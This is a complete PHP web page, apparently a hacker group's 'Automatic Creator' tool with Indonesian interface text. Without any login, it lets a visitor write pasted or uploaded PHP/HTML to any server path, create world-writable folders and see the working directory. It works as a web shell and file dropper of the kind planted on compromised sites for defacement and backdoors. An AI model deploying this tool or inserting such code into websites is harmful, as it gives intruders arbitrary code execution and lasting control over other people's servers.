<?php
session_start();
$success = false;
$error = "";

if ($_SERVER['REQUEST_METHOD'] === "POST") {
    $base_url = $_POST['base_url'] ?? '';
    $target_dir = trim($_POST['file_name'] ?? '');
    $target_filename = trim($_POST['folder_name'] ?? '');

    if (empty($base_url) || empty($target_dir) || empty($target_filename)) {
        $error = "Semua field wajib diisi.";
    } else {
        $allowed_ext = ['php', 'html'];
        $file_path = rtrim($target_dir, "/") . "/" . $target_filename;
        $user_ext = strtolower(pathinfo($target_filename, PATHINFO_EXTENSION));

        if (!in_array($user_ext, $allowed_ext)) {
            $error = "Hanya file .php dan .html yang diperbolehkan sebagai nama file tujuan.";
        } else {

            if (!is_dir($target_dir)) {
                if (!mkdir($target_dir, 0777, true)) {
                    $error = "Gagal membuat folder tujuan.";
                }
            }

            if (empty($error) && isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] === 0) {
                $upload_ext = strtolower(pathinfo($_FILES['upload_file']['name'], PATHINFO_EXTENSION));
                if (in_array($upload_ext, $allowed_ext)) {
                    if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $file_path)) {
                        $success = "File berhasil di-upload ke <b>$file_path</b>.";
                    } else {
                        $error = "Gagal upload file.";
                    }
                } else {
                    $error = "Upload hanya diperbolehkan untuk file .php dan .html.";
                }
            }

            elseif (empty($error)) {
                $html_content = $_POST['content'] ?? '';
                if (empty($html_content)) {
                    $error = "Isian script HTML tidak boleh kosong jika tidak upload file.";
                } else {
                    if (file_put_contents($file_path, $html_content) !== false) {
                        $success = "File berhasil dibuat dari input script HTML di <b>$file_path</b>.";
                    } else {
                        $error = "Gagal membuat file dari script HTML.";
                    }
                }
            }
        }
    }
}

$current_dir = getcwd();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Automatic Creator</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <link rel="shortcut icon" href="https://res.cloudinary.com/dpvlnsf7p/image/upload/v1749411925/unicorn-jahat_jo0ria.png" />
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@10"></script>
    <style>
        body {
            background: url('https://res.cloudinary.com/dvztple2b/image/upload/v1748786177/photo_2025-05-24_16-00-26_x4w454.jpg') no-repeat center center fixed;
            background-size: cover;
        }
        .main-box {
            background: #0b0e29;
            color: white;
            border-radius: 10px;
            margin-top: 40px;
            padding: 30px;
            box-shadow: 0 0 20px #0008;
        }
        .form-control, .btn {
            border-radius: 5px !important;
        }
        footer {
            color: #fff;
            text-align: center;
            margin-top: 40px;
            text-shadow: 1px 1px 3px #000;
        }
        label {
            color: #fff;
        }
        .info-dir {
            color: #ffeb3b;
            font-size: 0.98em;
            margin-bottom: 15px;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="row justify-content-center">
        <div class="col-lg-8">
            <div class="main-box">
                <h2 class="mb-2">Auto Create Folder & Files</h2>
                <div class="info-dir">
                    <b>Current Directory:</b> <?php echo htmlspecialchars($current_dir); ?>
                </div>
                <form method="post" enctype="multipart/form-data">
                    <div class="form-group">
                        <label>Script HTML (opsional jika upload file):</label>
                        <textarea name="content" class="form-control" rows="6" placeholder="Masukkan script HTML di sini..."><?php echo isset($_POST['content']) ? htmlspecialchars($_POST['content']) : ''; ?></textarea>
                    </div>
                    <div class="form-group">
                        <label>Base URL Directory :</label>
                        <input type="text" name="base_url" class="form-control" placeholder="Masukin Nama Domain" value="<?php echo isset($_POST['base_url']) ? htmlspecialchars($_POST['base_url']) : ''; ?>">
                    </div>
                    <div class="form-group">
                        <label>New Folder Name :</label>
                        <input type="text" name="file_name" class="form-control" placeholder="Contoh: uploads, js, css, dst" value="<?php echo isset($_POST['file_name']) ? htmlspecialchars($_POST['file_name']) : ''; ?>">
                    </div>
                    <div class="form-group">
                        <label>New Files Name (.php/.html):</label>
                        <input type="text" name="folder_name" class="form-control" placeholder="Contoh: index.html atau page.php" value="<?php echo isset($_POST['folder_name']) ? htmlspecialchars($_POST['folder_name']) : ''; ?>">
                    </div>
                    <div class="form-group">
                        <label>Pilih File (.php/.html) untuk di-upload (opsional):</label>
                        <input type="file" name="upload_file" class="form-control-file" accept=".php,.html">
                    </div>
                    <button type="submit" class="btn btn-warning btn-block">Proses!</button>
                </form>
            </div>
        </div>
    </div>
    <footer>
        © 2025 All rights reserved - Demonist Team.<br>- Halmahera1337 -
    </footer>
</div>
<?php if ($error): ?>
<script>
Swal.fire({icon:"error",title:"Error",html:"<?php echo htmlspecialchars($error); ?>"});
</script>
<?php elseif ($success): ?>
<script>
Swal.fire({icon:"success",title:"Success",html:"<?php echo $success; ?>"});
</script>
<?php endif; ?>
</body>
</html>
